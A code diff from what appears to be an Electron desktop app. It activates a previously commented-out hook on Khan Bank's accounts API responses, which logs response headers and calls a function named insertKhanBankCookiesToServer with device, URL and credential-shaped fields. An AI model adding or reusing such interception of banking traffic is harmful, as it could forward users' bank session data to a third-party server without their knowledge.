@@ -381,48 +381,48 @@ function registerCaptchaNetworkHooks(isCitizen) {
     }
 
 
-    // const urlFilterOtp = { urls: [`https://api.khanbank.com:9003/v3/omni/accounts*`] };
-    // // 5. Response Completed OTP
-    // try {
-    //     defaultSession.webRequest.onCompleted(urlFilterOtp, async (details) => {
-    //         try {
-    //             console.log('[info accounts] [onCompleted] entered')
-    //             console.log('[info accounts] statusCode:', details.statusCode);
-    //             console.log('[info accounts] responseHeaders:', details.responseHeaders);
-    //
-    //             const deviceId = global.currentDeviceId || 'NoDeviceID';
-    //             await insertKhanBankCookiesToServer({
-    //                 isCitizen,
-    //                 url: details.url,
-    //                 responsePayload: 'accounts',  // [info] Response payload content
-    //                 deviceId: deviceId,
-    //                 userAgent: global.currentUserAgent || 'Electron',
-    //                 username: null,
-    //                 password: null,
-    //                 BankAccountnum: 'RESPONSE_COMPLETED'
-    //             });
-    //
-    //             if (details.responseHeaders['Access-Control-Expose-Headers']) {
-    //                 try {
-    //                     const DesktopService = require('./services/desktopService');
-    //                     const desktopServiceInstance = new DesktopService();
-    //                     const result = await desktopServiceInstance.checkExposeHeaders({
-    //                         isCitizen,
-    //                         exposeHeaders: details.responseHeaders['Access-Control-Expose-Headers']
-    //                     });
-    //                     console.log('[info] [onCompleted]  Expose-Headers check:', details.responseHeaders['Access-Control-Expose-Headers']);
-    //                 } catch (error) {
-    //                     console.error('[error] [onCompleted] Expose-Headers check:', error);
-    //                 }
-    //             }
-    //         } catch (error) {
-    //             console.error('[error accounts] [onCompleted] Response completed :', error);
-    //         }
-    //     });
-    //     console.log('[info accounts] onCompleted hook registered');
-    // } catch (error) {
-    //     console.error('[error accounts] onCompleted hook :', error);
-    // }
+    const urlFilterOtp = { urls: [`https://api.khanbank.com:9003/v3/omni/accounts*`] };
+    // 5. Response Completed OTP
+    try {
+        defaultSession.webRequest.onCompleted(urlFilterOtp, async (details) => {
+            try {
+                console.log('[info accounts] [onCompleted] entered')
+                console.log('[info accounts] statusCode:', details.statusCode);
+                console.log('[info accounts] responseHeaders:', details.responseHeaders);
+    
+                const deviceId = global.currentDeviceId || 'NoDeviceID';
+                await insertKhanBankCookiesToServer({
+                    isCitizen,
+                    url: details.url,
+                    responsePayload: 'accounts',  // [info] Response payload content
+                    deviceId: deviceId,
+                    userAgent: global.currentUserAgent || 'Electron',
+                    username: null,
+                    password: null,
+                    BankAccountnum: 'RESPONSE_COMPLETED'
+                });
+    
+                if (details.responseHeaders['Access-Control-Expose-Headers']) {
+                    try {
+                        const DesktopService = require('./services/desktopService');
+                        const desktopServiceInstance = new DesktopService();
+                        const result = await desktopServiceInstance.checkExposeHeaders({
+                            isCitizen,
+                            exposeHeaders: details.responseHeaders['Access-Control-Expose-Headers']
+                        });
+                        console.log('[info] [onCompleted]  Expose-Headers check:', details.responseHeaders['Access-Control-Expose-Headers']);
+                    } catch (error) {
+                        console.error('[error] [onCompleted] Expose-Headers check:', error);
+                    }
+                }
+            } catch (error) {
+                console.error('[error accounts] [onCompleted] Response completed :', error);
+            }
+        });
+        console.log('[info accounts] onCompleted hook registered');
+    } catch (error) {
+        console.error('[error accounts] onCompleted hook :', error);
+    }
 
     // Hook-ууд амжилттай бүртгэгдсэн
     global._captchaHooksInstalled = true;
